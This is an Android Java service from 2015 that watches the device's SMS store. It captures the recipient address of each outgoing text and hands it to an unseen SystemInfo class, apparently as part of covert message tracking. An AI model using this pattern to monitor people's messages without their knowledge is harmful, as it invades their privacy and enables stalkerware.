package com.example.eldar.parse;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

/**
 * Created by Eldar on 19.09.2015.
 */
public class SmsService extends Service {
    private ContentResolver contentResolver;

    @Override
    public IBinder onBind(Intent intent){
        return null;
    }

    @Override
    public void onCreate(){
        super.onCreate();
        Log.d("Blin", "Sms service started");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d("Blin", "Sms service stop");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        contentResolver = getBaseContext().getContentResolver();
        contentResolver.registerContentObserver(Uri.parse("content://sms/"),true, new smsMonitor(new Handler()));
        return  START_NOT_STICKY;
    }

    private class smsMonitor extends ContentObserver {

        private static final String CONTENT_SMS = "content://sms/";
        private long id = 0;

        public smsMonitor(Handler handler){
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange){
            super.onChange(selfChange);
            Uri uriSMSURI = Uri.parse(CONTENT_SMS);
            Cursor cur = getContentResolver().query(uriSMSURI, null, null,null, null);
            cur.moveToNext();
            String protocol = cur.getString(cur.getColumnIndex("protocol"));
            String address = "";
            if(protocol == null){
                long messageId = cur.getLong(cur.getColumnIndex("_id"));
                if (messageId != id){
                    id = messageId;
                    int threadId = cur.getInt(cur.getColumnIndex("thread_id"));
                    Cursor c = getContentResolver().query(Uri.parse("content://sms/outbox/" + threadId), null, null, null, null);
                    c.moveToNext();
                    address = cur.getString(cur.getColumnIndex("address"));
                    SystemInfo.getSystemInfo(getApplicationContext(), "out_sms:" + address);
                }
            }


        }

    }

}
